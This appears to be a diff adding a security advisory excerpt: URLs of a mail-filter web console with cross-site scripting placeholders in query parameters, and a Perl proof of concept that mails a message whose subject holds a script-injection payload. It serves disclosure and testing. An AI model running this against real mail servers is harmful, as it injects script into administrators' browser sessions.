@@ -1,0 +1,43 @@
+http://www.example.com:8181/web/msgList/viewmsg/actions/msgAnalyse.asp \
+?Queue=Network%20Security&FileName=[XSS]&IsolatedMessageID=[XSS] \
+&ServerName=[XSS]&Dictionary=[XSS]&Scoring=[XSS]&MessagePart=[XSS]
+
+http://www.example.com:8181/web/msgList/viewmsg/actions/msgForwardToRis \
+kFilter.asp?Queue=[XSS]&FileName=[XSS]&IsolatedMessageID=[XSS]& \
+ServerName=[XSS]
+
+http://www.example.com:8181/web/msgList/viewmsg/viewHeaders.asp?Queue= \
+[XSS]&FileName=[XSS]&IsolatedMessageID=[XSS]&ServerName=[XSS]
+
+
+Proof of Concept :
+==================
+
+#!/usr/bin/perl
+use MIME::Lite;
+use Net::SMTP;
+
+(($server = $ARGV[0]) && ($rcpt = $ARGV[1])) || die "Usage: $0",
+"<server> <Recipient> \n";
+
+my $from_address = '<xss@mail.com>';
+my $to_address = "<" . $rcpt . ">";
+my $mail_host = $server;
+
+my $subject = 'VIAGRA XSS File "><BODY ONLOAD=alert(\'XSS\')>';
+my $message_body = "XSS Test File";
+
+$msg = MIME::Lite->new (
+  From => $from_address,
+  To => $to_address,
+  Subject => $subject,
+  Type =>'multipart/mixed'
+) or die "Error creating multipart container: $!\n";
+
+$msg->attach (
+  Type => 'TEXT',
+  Data => $message_body
+) or die "Error adding the text message part: $!\n";
+
+MIME::Lite->send('smtp', $mail_host, Timeout=>60);
+$msg->send;
